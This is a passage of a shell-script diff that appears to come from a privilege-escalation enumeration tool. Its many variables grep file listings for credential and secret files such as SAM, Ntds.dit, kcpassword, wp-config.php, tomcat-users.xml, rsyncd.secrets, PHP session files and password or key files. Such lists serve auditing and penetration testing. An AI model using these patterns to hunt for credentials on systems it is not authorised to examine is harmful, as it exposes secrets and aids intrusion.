-    PSTORAGE_SEEDDMS=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "seeddms.*$" | sort | uniq | head -n 70)
-    PSTORAGE_DDCLIENT=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "ddclient\.conf$" | sort | uniq | head -n 70)
-    PSTORAGE_KCPASSWORD=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "kcpassword$" | sort | uniq | head -n 70)
-    PSTORAGE_SENTRY=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "sentry$|sentry\.conf\.py$" | sort | uniq | head -n 70)
-    PSTORAGE_STRAPI=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "environments$" | sort | uniq | head -n 70)
-    PSTORAGE_CACTI=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "cacti$" | sort | uniq | head -n 70)
-    PSTORAGE_ROUNDCUBE=$(echo -e "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "roundcube$" | sort | uniq | head -n 70)
-    PSTORAGE_PASSBOLT=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "passbolt\.php$" | sort | uniq | head -n 70)
-    PSTORAGE_WGET=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.wgetrc$" | sort | uniq | head -n 70)
-    PSTORAGE_INTERESTING_LOGS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "access\.log$|error\.log$" | sort | uniq | head -n 70)
-    PSTORAGE_OTHER_INTERESTING_FILES=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.bashrc$|\.google_authenticator$|hosts\.equiv$|\.lesshst$|\.plan$|\.profile$|\.recently-used\.xbel$|\.rhosts$|\.sudo_as_admin_successful$" | sort | uniq | head -n 70)
-    PSTORAGE_WINDOWS_FILES=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "unattend\.inf$|.*\.rdg$|AppEvent\.Evt$|ConsoleHost_history\.txt$|FreeSSHDservice\.ini$|NetSetup\.log$|Ntds\.dit$|protecteduserkey\.bin$|RDCMan\.settings$|SAM$|SYSTEM$|SecEvent\.Evt$|appcmd\.exe$|bash\.exe$|datasources\.xml$|default\.sav$|drives\.xml$|groups\.xml$|https-xampp\.conf$|https\.conf$|iis6\.log$|index\.dat$|my\.cnf$|my\.ini$|ntuser\.dat$|pagefile\.sys$|printers\.xml$|recentservers\.xml$|scclient\.exe$|scheduledtasks\.xml$|security\.sav$|server\.xml$|setupinfo$|setupinfo\.bak$|sitemanager\.xml$|sites\.ini$|software$|software\.sav$|sysprep\.inf$|sysprep\.xml$|system\.sav$|unattend\.txt$|unattend\.xml$|unattended\.xml$|wcx_ftp\.ini$|ws_ftp\.ini$|web.*\.config$|winscp\.ini$|wsl\.exe$" | sort | uniq | head -n 70)
-    PSTORAGE_DATABASE=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '/man/|/usr/|/var/cache/' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.db$|.*\.sqlite$|.*\.sqlite3$" | sort | uniq | head -n 70)
-    PSTORAGE_BACKUPS=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "backup$|backups$" | sort | uniq | head -n 70)
-    PSTORAGE_PASSWORD_FILES=$(echo -e "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*password.*$|.*credential.*$|creds.*$|.*\.key$" | sort | uniq | head -n 70)
+    PSTORAGE_SYSTEMD=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/usr|^/lib64|^/opt|^/systemd|^/bin|^/etc|^/lib32|^/private|^/run|^/tmp|^/lib|^/system|^/applications|^/.cache|^/srv|^/snap|^$GREPHOMESEARCH|^/sbin|^/sys|^/var|^/mnt|^/cdrom|^/media" | grep -E ".*\.service$" | sort | uniq | head -n 70)
+    PSTORAGE_TIMER=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/usr|^/lib64|^/opt|^/systemd|^/bin|^/etc|^/lib32|^/private|^/run|^/tmp|^/lib|^/system|^/applications|^/.cache|^/srv|^/snap|^$GREPHOMESEARCH|^/sbin|^/sys|^/var|^/mnt|^/cdrom|^/media" | grep -E ".*\.timer$" | sort | uniq | head -n 70)
+    PSTORAGE_SOCKET=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/usr|^/lib64|^/opt|^/systemd|^/bin|^/etc|^/lib32|^/private|^/run|^/tmp|^/lib|^/system|^/applications|^/.cache|^/srv|^/snap|^$GREPHOMESEARCH|^/sbin|^/sys|^/var|^/mnt|^/cdrom|^/media" | grep -E ".*\.socket$" | sort | uniq | head -n 70)
+    PSTORAGE_DBUS=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/etc" | grep -E "system\.d$" | sort | uniq | head -n 70)
+    PSTORAGE_MYSQL=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -v -E 'mysql/mysql' | grep -E '^/etc/.*mysql|/usr/var/lib/.*mysql|/var/lib/.*mysql' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "mysql$" | sort | uniq | head -n 70)
+    PSTORAGE_MARIADB=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "mariadb\.cnf$|debian\.cnf$" | sort | uniq | head -n 70)
+    PSTORAGE_POSTGRESQL=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "pgadmin.*\.db$|pg_hba\.conf$|postgresql\.conf$|pgsql\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_APACHE=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "sites-enabled$|000-default\.conf$|php\.ini$" | sort | uniq | head -n 70)
+    PSTORAGE_PHP_SESSIONS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*' | grep -E "^/private|^/tmp|^/mnt|^/var" | grep -E "sess_.*$" | sort | uniq | head -n 70)
+    PSTORAGE_PHP_FILES=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*config.*\.php$|database\.php$|db\.php$|storage\.php$|settings\.php$" | sort | uniq | head -n 70)
+    PSTORAGE_WORDPRESS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "wp-config\.php$" | sort | uniq | head -n 70)
+    PSTORAGE_DRUPAL=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E '/default/settings.php' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "settings\.php$" | sort | uniq | head -n 70)
+    PSTORAGE_MOODLE=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E 'moodle/config.php' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "config\.php$" | sort | uniq | head -n 70)
+    PSTORAGE_TOMCAT=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "tomcat-users\.xml$" | sort | uniq | head -n 70)
+    PSTORAGE_MONGO=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "mongod.*\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_SUPERVISORD=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "supervisord\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_CESI=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "cesi\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_RSYNC=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "rsyncd\.conf$|rsyncd\.secrets$" | sort | uniq | head -n 70)
